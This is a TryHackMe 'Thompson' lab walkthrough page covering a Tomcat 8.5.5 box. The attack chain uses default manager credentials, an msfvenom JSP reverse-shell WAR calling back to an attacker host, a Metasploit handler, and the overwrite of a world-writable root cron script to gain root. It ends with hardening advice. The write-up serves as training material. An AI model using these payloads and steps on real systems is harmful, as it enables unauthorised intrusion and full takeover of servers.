@@ -1,0 +1,142 @@
+---
+import Article from "../../../layouts/Article.astro";
+import "../../../styles/writeup.css";
+import { withBase } from "../../../utils/paths";
+---
+
+<Article
+  title="THM Thompson — Writeup"
+  description="TryHackMe Thompson room walkthrough — Apache Tomcat manager default credentials, WAR file upload RCE, reverse shell, and cron-based root privilege escalation."
+  backHref={withBase('/writeups')}
+  backLabel="cd ./writeups"
+  navTitle="writeups"
+  articleLabel={'TryHackMe "Thompson"'}
+>
+<div class="container">
+<div class="writeup-header">
+  <span class="platform-tag">TryHackMe</span>
+  <h1>Thompson</h1>
+  <p class="subtitle">Linux · Apache Tomcat · Default Credentials · WAR Deployment RCE · Cron Privesc</p>
+  <div class="meta">
+    <span class="meta-item os">Linux</span>
+    <span class="meta-item difficulty easy">Easy</span>
+  </div>
+  <div class="tags">
+    <span class="tag">Tomcat Manager</span>
+    <span class="tag">Default Credentials</span>
+    <span class="tag">WAR Upload RCE</span>
+    <span class="tag">Reverse Shell</span>
+    <span class="tag">Cron Privesc</span>
+  </div>
+</div>
+
+<div class="toc">
+  <div class="toc-title">Table of Contents</div>
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#recon">Reconnaissance</a></li>
+    <li><a href="#enum">Web Enumeration</a></li>
+    <li><a href="#foothold">Foothold — Tomcat Manager RCE</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+    <li><a href="#flags">Flags</a></li>
+    <li><a href="#takeaways">Lessons Learned</a></li>
+  </ul>
+</div>
+
+<section class="writeup-section" id="description">
+  <h2><span class="num">00</span> Description</h2>
+  <p>Thompson is a beginner-friendly Linux box built around a stock Apache Tomcat 8.5.5 installation. The path to root goes through the Tomcat Manager application, which is left reachable with a known default <code>manager-gui</code> credential pair, allowing a WAR file to be deployed and executed as a reverse shell. Privilege escalation relies on a world-writable helper script that is silently re-executed by root on a schedule.</p>
+  <figure class="screenshot"><img src={withBase('/assets/img/writeups/thm/thompson-tomcat-landing.png')} alt="Apache Tomcat 8.5.5 default landing page on port 8080"><figcaption>Default Tomcat 8.5.5 landing page on port 8080</figcaption></figure>
+</section>
+
+<section class="writeup-section" id="recon">
+  <h2><span class="num">01</span> Reconnaissance</h2>
+  <pre data-lang="bash"><code>nmap -sV -sC -oN nmap.txt &lt;target-ip&gt;</code></pre>
+  <table>
+    <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+    <tr><td>22</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</td></tr>
+    <tr><td>8009</td><td>AJP (ajp13)</td><td>Apache Jserv Protocol v1.3</td></tr>
+    <tr><td>8080</td><td>HTTP</td><td>Apache Tomcat 8.5.5</td></tr>
+  </table>
+  <p>Port 8080 running Apache Tomcat 8.5.5 stood out immediately as the entry point — Tomcat ships with a manager application that is a common source of misconfigurations, and this version is old enough to carry known default-credential issues.</p>
+</section>
+
+<section class="writeup-section" id="enum">
+  <h2><span class="num">02</span> Web Enumeration</h2>
+  <div class="step"><div class="step-num">1</div><div class="step-body">Directory brute force against the Tomcat instance:<pre data-lang="bash"><code>gobuster dir -u http://&lt;target-ip&gt;:8080 -w /usr/share/wordlists/dirb/common.txt</code></pre></div></div>
+  <table>
+    <tr><th>Discovered path</th><th>Purpose</th></tr>
+    <tr><td><code>/manager</code></td><td>Tomcat Web Application Manager</td></tr>
+    <tr><td><code>/host-manager</code></td><td>Virtual host manager</td></tr>
+    <tr><td><code>/docs</code></td><td>Tomcat documentation</td></tr>
+    <tr><td><code>/examples</code></td><td>Default example apps</td></tr>
+  </table>
+  <p>These paths are also linked directly from the default landing page. Browsing to <code>/manager</code> returned a 401 asking for credentials rather than a 403, confirming the app was reachable and just needed authentication. The <code>/docs</code> page for this version confirms that Tomcat 8.5.5 ships with sample credentials for the <code>manager-gui</code> role — this build still had that default account enabled. Trying the well-known pair <code>tomcat:s3cret</code> against the manager login worked.</p>
+</section>
+
+<section class="writeup-section" id="foothold">
+  <h2><span class="num">03</span> Foothold — Tomcat Manager RCE</h2>
+  <p>With valid <code>manager-gui</code> credentials (<code>tomcat:s3cret</code>), <code>/manager/html</code> opened and exposed the full list of deployed applications plus a form to deploy a new WAR file directly from the browser.</p>
+  <figure class="screenshot"><img src={withBase('/assets/img/writeups/thm/thompson-manager-deploy.png')} alt="Tomcat Manager application list and WAR deploy form"><figcaption>Tomcat Manager — deployed apps and WAR upload/deploy form</figcaption></figure>
+  <div class="callout"><strong>Why this works:</strong> the Manager app is explicitly designed to let an authenticated user deploy arbitrary web applications. A WAR file is just a packaged web app, so a WAR containing a JSP reverse shell is executed server-side with the same privileges as the Tomcat service the moment it is deployed.</div>
+
+  <h3>Building the payload</h3>
+  <pre data-lang="bash"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=4444 -f war &gt; rev.war</code></pre>
+
+  <h3>Deploying it</h3>
+  <div class="step"><div class="step-num">1</div><div class="step-body">Uploaded <code>rev.war</code> through the Manager's "WAR file to deploy" form shown above, which auto-deployed it as context <code>/rev</code>.</div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Listed the WAR's contents locally to recover the generated JSP filename, since msfvenom randomizes it:<pre data-lang="bash"><code>jar tf rev.war</code></pre>This returned a random name, e.g. <code>kjfefyivktzuqy.jsp</code>.</div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">Started a matching Metasploit handler:<pre data-lang="bash"><code>msfconsole -q -x "use exploit/multi/handler; set payload java/jsp_shell_reverse_tcp; set LHOST &lt;attacker-ip&gt;; set LPORT 4444; run"</code></pre></div></div>
+  <div class="step"><div class="step-num">4</div><div class="step-body">Triggered the payload by requesting the deployed JSP:<pre data-lang="bash"><code>curl http://&lt;target-ip&gt;:8080/rev/kjfefyivktzuqy.jsp</code></pre>This returned a shell on the waiting handler as the Tomcat service user.</div></div>
+
+  <p>From the shell, the first flag was sitting in the only non-service home directory:</p>
+  <pre data-lang="bash"><code>cat /home/jack/user.txt</code></pre>
+  <span class="flag">🚩 user.txt captured</span>
+</section>
+
+<section class="writeup-section" id="privesc">
+  <h2><span class="num">04</span> Privilege Escalation</h2>
+  <p>Standard checks came up empty:</p>
+  <pre data-lang="bash"><code>id
+sudo -l</code></pre>
+  <p>Nothing useful came back from either command, so the next step was looking around the user's home directory for anything unusual:</p>
+  <pre data-lang="bash"><code>ls -l /home/jack</code></pre>
+  <pre data-lang="text"><code>-rwxrwxrwx 1 jack jack 45 Nov 21 12:31 id.sh
+-rw-r--r-- 1 root root  0 Nov 21 12:32 test.txt</code></pre>
+  <p><code>id.sh</code> was world-writable and contained a trivial script:</p>
+  <pre data-lang="bash"><code>#!/bin/bash
+id &gt; test.txt</code></pre>
+  <p>Critically, <code>test.txt</code> was owned by <strong style="color:#fff">root</strong>, even though <code>jack</code> owns the script that writes to it. Reading it confirmed the script is being re-run automatically by root, most likely via a root-owned cron job targeting this script:</p>
+  <pre data-lang="bash"><code>cat /home/jack/test.txt</code></pre>
+  <pre data-lang="text"><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
+  <div class="callout"><strong>The bug:</strong> <code>id.sh</code> is writable by anyone (<code>777</code>) but executed on a timer by root. Overwriting its contents means the next scheduled run executes arbitrary commands as root.</div>
+
+  <div class="step"><div class="step-num">1</div><div class="step-body">Overwrote the script to read the root flag instead of running <code>id</code>:<pre data-lang="bash"><code>echo -e '#!/bin/bash\ncat /root/root.txt > test.txt' > /home/jack/id.sh</code></pre></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Waited for the next scheduled execution, then read the result back from the same file the script always writes to:<pre data-lang="bash"><code>cat /home/jack/test.txt</code></pre></div></div>
+  <span class="flag">🚩 root.txt captured</span>
+</section>
+
+<section class="writeup-section" id="flags">
+  <h2><span class="num">05</span> Flags</h2>
+  <table>
+    <tr><th>#</th><th>Flag</th><th>Location</th></tr>
+    <tr><td>1</td><td><code>user.txt</code></td><td><code>/home/jack/</code></td></tr>
+    <tr><td>2</td><td><code>root.txt</code></td><td>read via <code>/home/jack/test.txt</code>, originally in <code>/root/</code></td></tr>
+  </table>
+  <h3>Attack chain</h3>
+  <p><code>Recon (nmap)</code> → Tomcat 8.5.5 on 8080 → <code>gobuster</code> finds <code>/manager</code> → default <code>manager-gui</code> credentials → WAR upload via Manager deploy form → <code>msfvenom</code> JSP reverse shell → shell as Tomcat service user → <code>user.txt</code> → world-writable <code>id.sh</code> re-run by root → overwrite script → <code>root.txt</code>.</p>
+</section>
+
+<section class="writeup-section" id="takeaways">
+  <h2><span class="num">06</span> Lessons Learned</h2>
+  <div class="takeaway-card">
+    <ul>
+      <li><strong>Disable or rotate default Tomcat Manager credentials.</strong> A known <code>manager-gui</code> account turns the Manager app's intended WAR-deploy feature straight into remote code execution.</li>
+      <li><strong>Restrict access to <code>/manager</code> and <code>/host-manager</code>.</strong> These should be bound to localhost or an admin network, not exposed on the same listener as the public app.</li>
+      <li><strong>Never leave a root-run script world-writable.</strong> Any file executed by a privileged cron job must be owned and writable only by root (or the account it legitimately belongs to).</li>
+      <li><strong>Audit scheduled tasks regularly.</strong> A root cron entry calling a user-owned script is an immediate privilege escalation path and should be flagged by any host-hardening review.</li>
+    </ul>
+  </div>
+</section>
+</div>
+</Article>
